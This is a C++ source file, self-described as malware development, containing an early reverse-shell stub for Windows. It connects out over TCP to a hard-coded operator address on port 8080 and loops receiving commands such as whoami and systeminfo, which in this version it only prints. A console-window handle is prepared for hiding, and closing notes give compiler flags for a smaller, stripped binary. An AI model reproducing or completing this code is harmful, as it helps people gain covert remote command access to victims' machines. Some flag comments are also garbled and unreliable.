/*
 Author:    Lemur
 Github:    https://github.com/1emvr
 Email:     1emvr@protonmail.com
 Date:      12/28/2022  01:44 AM

 Malware Development in C++

*/
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#include <stdio.h>
#include <iostream>

#define DEFAULT_BUFLEN 1024
#pragma comment(lib, "Ws2_32.lib")

void RevShell() {
/*
    We declare a WSDATA handle to store value for the soket information.

    With a socket handler, we define the connection/stream type and the protocol.
    With that, we define the parameters for our connection with the address/type
    and port number.

    We error check connection and gracefully exit if a SOCKET_ERROR occurs.
    Otherwise, it switches to stdin.

    We create an empty buffer (with BUFLEN size) and start a loop that gives input
    received from tcpsock to the command buffer using the Windows rcv API call.

    Next, we parse for a pre-defined set of commands.

    We then reset the memory @CommandRecieved to zero, essentially a "free()"
    There's still no real functionality to this as it's a simple netcat connection.
*/
    WSADATA wsaver;
    WSAStartup(MAKEWORD(2, 2), &wsaver);

    SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("192.168.1.104");
    addr.sin_port = htons(8080);

    if(connect(tcpsock, (SOCKADDR *) &addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(tcpsock);
        WSACleanup();
        exit(0);
    } else {
        std::cout << "[+] Connected. Hit <Enter> to disconnect..." << std::endl;
        
        char CommandReceived[DEFAULT_BUFLEN] = "";
        while (true) {
            int Result = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN, 0);
            std::cout << "Command received: " << CommandReceived;
            std::cout << "Length: " << Result << std::endl;

            if((strcmp(CommandReceived, "whoami\n") == 0)) {
                std::cout << "Command: whoami" << std::endl;
            } else if ((strcmp(CommandReceived, "systeminfo\n") == 0)) {
                std::cout << "Command: systeminfo" << std::endl;
            } else if ((strcmp(CommandReceived, "exit\n") == 0)) {
                std::cout << "Command: exit";
                std::cout << "Closing connection" << std::endl;
            } else {
                std::cout << "Unknown command..." << std::endl;
            }
            

            memset(CommandReceived, 0, sizeof(CommandReceived));
        }
    }
    closesocket(tcpsock);
    WSACleanup();
    exit(0);
}

int main() {
/*
    We declare a HWND handler, then call on "Console" for use.

    Then find our blank window and declare our HWND handler with it.
    We set the "Show Window" option. We're using SW_SHOWNORMAL temporarily
    for debugging purposes, since there's no real functionality to this.

    We then call our RevShell() function and wait, finally returning zero.
*/
    HWND sneakyboi;
    AllocConsole();

    sneakyboi = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(sneakyboi, SW_SHOWNORMAL);

    RevShell();
    return 0;
}

/* 
Note: For minimal-size compilation use: 
    
    g++ -std=c++11 maldev.cpp -o maldev.exe -s -lws2_32 -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

    -static-libstdc++/libgcc :
        Used to compile C/Cpp headers statically, together since we're using a combination.

    -fmerge-all-constants :
        Will combine all constant arrays/ints and chars and init them from the start.
    
    -Wno-write-strings :
        Required to convert strings to char.
    
    -fno-exceptions :
        Used to specify that the binary has no exceptions.
    
    -std=c++11 : 
        This version excludes some functionality but allows for smaller size.
    
    -lsw2_32 :   
        Informs the comiler to link lsw2_32.lib.
    
    -s : Strips metadata from the executable, making the size smaller.
*/